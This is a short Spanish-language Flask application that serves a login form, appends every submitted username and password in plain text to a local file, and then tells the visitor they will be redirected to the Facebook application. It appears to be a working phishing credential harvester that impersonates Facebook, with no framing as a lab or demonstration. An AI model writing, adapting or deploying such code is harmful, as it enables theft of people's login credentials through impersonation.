from flask import Flask, render_template, request
import os

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('index.html')

@app.route('/guardar', methods=['POST'])
def guardar():
    usuario = request.form['usuario']
    contrasena = request.form['contrasena']

    with open("datos_ingresados.txt", "a") as archivo:
        archivo.write(f"Usuario: {usuario} | Contraseña: {contrasena}\n")

    return f"<h2>¡Será redireccionado a la aplicación de Facebook!</h2><a href='/'>Volver</a>"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
